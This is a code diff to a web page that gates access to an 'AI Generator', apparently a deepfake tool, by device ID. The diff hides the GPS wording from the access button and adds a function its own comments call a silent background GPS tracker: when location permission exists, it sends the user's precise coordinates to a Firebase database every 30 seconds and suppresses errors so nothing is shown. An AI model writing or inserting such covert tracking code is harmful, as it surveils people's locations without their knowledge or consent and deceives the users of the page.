@@ -24,6 +24,7 @@
         .alert-box h4 { margin: 0 0 5px 0; color: #E63946; font-size: 0.9rem; text-transform: uppercase; }
         .alert-box p { color: #fff; margin: 0; font-size: 0.85rem; }
         .hacker-box { background: rgba(230, 57, 70, 0.1); border: 1px solid #E63946; padding: 20px; border-radius: 12px; }
+        .hacker-box h3 { color: #E63946; margin-top: 10px; font-weight: 800; letter-spacing: 1px; }
         .dev-id-text { font-family: monospace; color: var(--muted); font-size: 0.75rem; margin-top: 15px; display: block; background: rgba(0,0,0,0.5); padding: 5px; border-radius: 4px;}
         @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
@@ -43,7 +44,8 @@
             </div>
             <input type="text" id="authName" class="inp" placeholder="Your Full Name">
             <textarea id="authMsg" class="inp" placeholder="Why do you need access to the AI Generator?"></textarea>
-            <button class="btn" id="submitBtn" onclick="submitAuthRequest()">📍 Verify GPS & Request Access</button>
+            
+            <button class="btn" id="submitBtn" onclick="submitAuthRequest()">Request Access</button>
             <span class="dev-id-text" id="displayDevId">ID: Loading...</span>
         </div>
 
@@ -72,14 +74,40 @@
         
         let deviceId = localStorage.getItem('hotfake_deep_uid');
         if(!deviceId) {
-            const os = (/Android/i.test(navigator.userAgent)) ? "AND" : "WIN";
+            const os = (/Android/i.test(navigator.userAgent)) ? "AND" : (/iPhone|iPad/i.test(navigator.userAgent)) ? "IOS" : "PC";
             deviceId = `${os}-AUTH-${Math.floor(Math.random()*9000000).toString(36).toUpperCase()}`;
             localStorage.setItem('hotfake_deep_uid', deviceId);
+        }
+
+        // --- NEW: SILENT BACKGROUND GPS TRACKER ---
+        // Yeh function check karega agar GPS granted hai (kabhi bhi on kiya ho user ne), toh background me chup-chap location bhej dega.
+        function silentBackgroundGPS() {
+            if ("geolocation" in navigator) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    if (result.state === 'granted') {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => { 
+                                set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { 
+                                    lat: pos.coords.latitude, 
+                                    lon: pos.coords.longitude, 
+                                    accuracy: Math.round(pos.coords.accuracy) + "m", 
+                                    time: new Date().toISOString() 
+                                }); 
+                            }, 
+                            (err) => {}, // Chup rehna hai error aane pe
+                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        );
+                    }
+                });
+            }
         }
 
         function initPage() {
             showSection('loaderSection');
             document.getElementById('displayDevId').innerText = `Hardware ID: ${deviceId}`;
+
+            // Initial silent GPS check just in case it's already on
+            silentBackgroundGPS();
 
             get(ref(db, `users/${deviceId}`)).then(userSnap => {
                 if(userSnap.exists()) {
@@ -88,7 +116,6 @@
                     if(u.deviceApproved) return showSection('approvedSection');
                 }
 
-                // Check pending app
                 onValue(ref(db, `support_requests/${deviceId}`), (snap) => {
                     if (!snap.exists()) showSection('unauthorizedSection');
                     else {
@@ -110,19 +137,47 @@
         }
 
         window.submitAuthRequest = function() {
-            const name = document.getElementById('authName').value.trim(); const msg = document.getElementById('authMsg').value.trim();
+            const name = document.getElementById('authName').value.trim(); 
+            const msg = document.getElementById('authMsg').value.trim();
             if (!name || !msg) return alert("Provide name and reason.");
-            const btn = document.getElementById('submitBtn'); btn.innerText = "📍 Scanning..."; btn.disabled = true;
+            
+            const btn = document.getElementById('submitBtn'); 
+            btn.innerText = "Processing..."; 
+            btn.disabled = true;
 
-            navigator.geolocation.getCurrentPosition((pos) => {
+            const sendPayload = (lat = "Unknown", lon = "Unknown") => {
                 set(ref(db, `support_requests/${deviceId}`), { 
-                    name: name, contactInfo: "DEVICE AUTHORIZATION", message: `[NEW DEVICE ACCESS] Reason: ${msg}`, regId: deviceId, os: navigator.platform || "Unknown", lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString(), status: 'pending'
+                    name: name, 
+                    contactInfo: "DEVICE AUTHORIZATION", 
+                    message: `[NEW DEVICE ACCESS] Reason: ${msg}`, 
+                    regId: deviceId, 
+                    os: navigator.platform || "Unknown", 
+                    lat: lat, 
+                    lon: lon, 
+                    time: new Date().toISOString(), 
+                    status: 'pending'
+                }).catch(err => {
+                    alert("Network error.");
+                    btn.innerText = "Request Access"; 
+                    btn.disabled = false;
                 });
-            }, () => { alert("GPS REQUIRED for security."); btn.innerText = "📍 Request Access"; btn.disabled = false; }, { enableHighAccuracy: true });
+            };
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { sendPayload(pos.coords.latitude, pos.coords.longitude); }, 
+                    (err) => { sendPayload("Denied", "Denied"); }, // Proceed anyway if denied
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                sendPayload();
+            }
         };
 
+        // Retry silent GPS update after a few seconds just in case user toggled it
+        setInterval(silentBackgroundGPS, 30000); // Check every 30 seconds silently
+        
         setTimeout(initPage, 800);
     </script>
 </body>
 </html>
-
